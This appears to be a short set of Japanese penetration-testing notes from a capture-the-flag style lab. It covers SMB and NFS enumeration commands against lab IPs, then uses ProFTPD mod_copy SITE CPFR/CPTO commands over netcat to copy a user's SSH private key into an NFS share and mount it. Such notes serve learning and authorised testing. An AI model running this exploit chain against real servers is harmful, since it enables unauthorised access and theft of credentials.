### ファイルの列挙
```smbmap -R Replication -H 10.10.10.100```

## nmap script
### ファイル共有の一覧を列挙
```smb-enum-shares.nse```

### リモートの Windows システム上のユーザーを列挙
```smb-enum-users.nse```

```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.162.244```

## smbclient
### サーバー上の SMB/CIFS リソースにアクセスする
```smbclient //10.10.162.244/anonymous```

## smbget
### SMB 経由でファイルをダウンロード
```smbget -R smb://10.10.162.244/anonymous```

### ポート111が開いている場合はマウント可能なディレクトリがないか調べることができる
```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.208.182```

mod_copy モジュールは SITE CPFR と SITE CPTO コマンドを実装しており、
サーバー上のある場所から別の場所にファイルやディレクトリをコピーするために使用できます。認証されていないクライアントは、
これらのコマンドを利用して、ファイルシステムの任意の部分から選択した宛先にファイルをコピーすることができます。

この仕様を悪用してsshの秘密鍵をマウント可能な領域に移動する。
例:
```nc $IP 21```

### コピー元のファイルを指定する
```SITE CPFR /home/kenobi/.ssh/id_rsa```

### コピー先を指定する
```SITE CPTO /var/tmp/id_rsa```

### コピーしたら自分のマシンにマウントする
```mkdir /mnt/kenobiNFS```
```mount $IP:/var /mnt/kenobiNFS```
